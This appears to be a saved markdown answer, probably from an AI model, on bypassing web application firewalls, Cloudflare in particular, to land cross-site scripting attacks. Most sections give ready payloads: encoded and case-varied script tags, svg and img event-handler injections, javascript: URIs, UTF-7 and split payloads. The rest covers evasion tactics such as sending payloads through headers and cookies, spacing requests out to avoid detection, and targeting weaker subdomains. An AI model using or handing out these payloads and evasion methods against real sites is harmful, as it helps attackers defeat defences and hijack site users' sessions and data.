---
title: "Bypassing a Web Application Firewall (WAF) for XSS exploits"
tags:
  - WAF-bypass
---

Bypassing a Web Application Firewall (WAF) for XSS (Cross-Site Scripting) exploits requires a combination of techniques to evade detection mechanisms. Here’s a comprehensive approach to bypass WAFs when testing XSS vulnerabilities, relevant to your scenario with DalFox and Cloudflare WAF.

---

### **1. Understand WAF Behavior**
Before attempting to bypass:
- **Review server responses**: Check how different payloads are filtered or transformed.
- **Identify blocked keywords and patterns**: Pay attention to blocked scripts, tags, or common terms like `script`, `onload`, and `alert`.

---

### **2. Common XSS Payload Bypass Techniques**
#### **1. Character Encoding Variations**
Encoding payloads hides the attack vectors from basic filters. Use:
- **Hexadecimal Encoding**:  
  Example: `<script>alert(1)</script>` → `%3Cscript%3Ealert%281%29%3C/script%3E`
- **Double URL Encoding**:  
  Encode twice for deeper filters: `%253Cscript%253Ealert%25281%2529%253C/script%253E`
  
#### **2. Case Manipulation**
Most WAFs are case-sensitive for keywords.
- `script` → `ScRiPt`
- `onload` → `OnLoAd`

---

### **3. Breaking Up Keywords**
Inject payloads with character splitting or concatenation.
- `<scr` + `ipt>alert(1)</scr` + `ipt>`
- Inject comments or null bytes:  
  ```
  <scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
  ```

---

### **4. HTML Entity Encoding**
Obfuscate characters using HTML entities.
- `<script>` → `&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;`
- Payload: `&#x3C;svg&#x20;onload&#x3D;alert(1)&#x3E;`

---

### **5. Alternate Scriptless XSS Payloads**
Use techniques that don’t explicitly rely on `<script>`.
1. SVG:  
   ```html
   <svg onload="alert(1)">
   ```
2. Image XSS:  
   ```html
   <img src=x onerror=alert(1)>
   ```
3. `javascript:` URI:  
   ```html
   <a href="javascript:alert(1)">Click me</a>
   ```

---

### **6. Using Non-Alphanumeric Payloads**
Some WAFs filter based on alphanumeric sequences.
- Example payload using fewer alphabets:  
  ```html
  <svg/onload=alert`1`>
  ```

---

### **7. JSON-Based and DOM Context Manipulation**
If responses use JSON or DOM content, use specific payloads like:
```javascript
{"key":"\";alert(1);//"}
```
Or:
```html
"><svg onload=alert(1)>
```

---

### **8. Bypassing Input Length Restrictions**
Split the payload across multiple parameters:
1. First payload in one parameter: `"><`
2. Second payload in another: `svg onload=alert(1)>`

---

### **9. Specific Cloudflare WAF Bypass Strategies**
Cloudflare actively monitors payload signatures and behaviors, so:
1. **Randomize or encode payloads**:
   - Cloudflare often detects standard payloads like `<script>alert(1)</script>`.
   - Use obfuscation:
     ```html
     <svg/onload=confirm`1`>
     ```
2. **Use alternate event handlers or DOM elements**:
   - Instead of `onload`, try `onfocus`, `onscroll`, or `onclick`.
   - `<input autofocus onfocus="alert(1)">`
3. **Subdomain-specific bypassing** (if WAF rules are not global):  
   - Test smaller subdomains or API endpoints where protections are weaker or misconfigured.

---

### **10. Double Submission and Cache Poisoning**
Bypass restrictions with split payloads over multiple requests:
1. **First** request sends benign data (to store in a cache or state variable).
2. **Second** request sends a crafted payload that uses the cached value.

---

### **11. Using JavaScript Template Literals**
For bypassing content filters in JavaScript:
```javascript
`<svg/onload=alert\`1\`>`
```

---

### **12. Advanced Content Injection**
Leverage context-specific injections:
- Use `innerHTML` for direct HTML injection vulnerabilities:
  ```html
  <div id="output"></div>
  <script>
    document.getElementById("output").innerHTML = "<img src=x onerror=alert(1)>";
  </script>
  ```

---

### **13. XSS via UTF-7 Encoding**
If character set encoding is poorly configured, attempt UTF-7 payloads:
```html
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

---

### **14. WAF Signature Variants for Cloudflare**
When facing Cloudflare’s behavioral analysis:
- **Time-based obfuscation**: Send smaller payloads over a longer period to avoid detection based on burst patterns.
- **Alternate delivery vectors**:  
  Try payloads within different request types:
  - Headers: `Referer`, `User-Agent`, `X-Forwarded-For`
  - Cookies:  
    ```javascript
    document.cookie = 'alert=1';
    ```

---

### **Combining Techniques**
Most successful bypasses are a combination of methods:
- Use an **encoded payload**, **case variation**, and **split elements** together:
  ```html
  <img sRc="x" oNeRroR=alert(1)>
  ```

---

### **Tools and Resources**
1. **DalFox (for XSS discovery)**: Automate payload discovery.
2. **Burp Suite (manual and automated WAF bypassing)**: Use extensions like **Turbo Intruder** for payload injection.
3. **PayloadAllTheThings**: Comprehensive repository of payloads.

---

### **Closing Thoughts**
Bypassing a WAF requires creativity and an understanding of how inputs are sanitized or blocked. An iterative approach using varying payloads, encodings, and delivery methods, combined with detailed analysis of responses, often leads to success.

